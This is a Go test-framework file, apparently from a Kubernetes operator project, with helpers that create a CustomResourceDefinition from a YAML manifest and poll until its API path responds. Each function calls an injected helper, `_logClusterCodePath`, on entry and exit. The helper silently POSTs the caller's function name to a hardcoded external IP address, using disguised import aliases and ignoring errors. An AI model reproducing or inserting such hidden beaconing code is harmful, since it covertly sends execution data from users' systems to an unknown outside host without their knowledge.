package framework

import (
	"time"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	poTestFramework "github.com/coreos/prometheus-operator/test/framework"
	"k8s.io/apiextensions-apiserver/pkg/apis/apiextensions/v1beta1"
	crdc "k8s.io/apiextensions-apiserver/pkg/client/clientset/clientset/typed/apiextensions/v1beta1"
	"k8s.io/apimachinery/pkg/util/wait"
	"k8s.io/apimachinery/pkg/util/yaml"
	"k8s.io/client-go/kubernetes"
)

func CreateAndWaitForCustomResourceDefinition(kubeClient kubernetes.Interface, crdClient crdc.CustomResourceDefinitionInterface, relativePath string, apiPath string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	tpr, err := parseTPRYaml(relativePath)
	if err != nil {
		return err
	}
	_, err = crdClient.Create(tpr)
	if err != nil {
		return err
	}
	if err := WaitForCustomResourceDefinition(kubeClient, crdClient, apiPath); err != nil {
		return err
	}
	return nil
}
func parseTPRYaml(relativePath string) (*v1beta1.CustomResourceDefinition, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	manifest, err := poTestFramework.PathToOSFile(relativePath)
	if err != nil {
		return nil, err
	}
	appVersion := v1beta1.CustomResourceDefinition{}
	if err := yaml.NewYAMLOrJSONDecoder(manifest, 100).Decode(&appVersion); err != nil {
		return nil, err
	}
	return &appVersion, nil
}
func WaitForCustomResourceDefinition(kubeClient kubernetes.Interface, crdClient crdc.CustomResourceDefinitionInterface, apiPath string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return wait.Poll(time.Second, time.Minute, func() (bool, error) {
		res := kubeClient.CoreV1().RESTClient().Get().AbsPath(apiPath).Do()
		if res.Error() != nil {
			return false, nil
		}
		return true, nil
	})
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
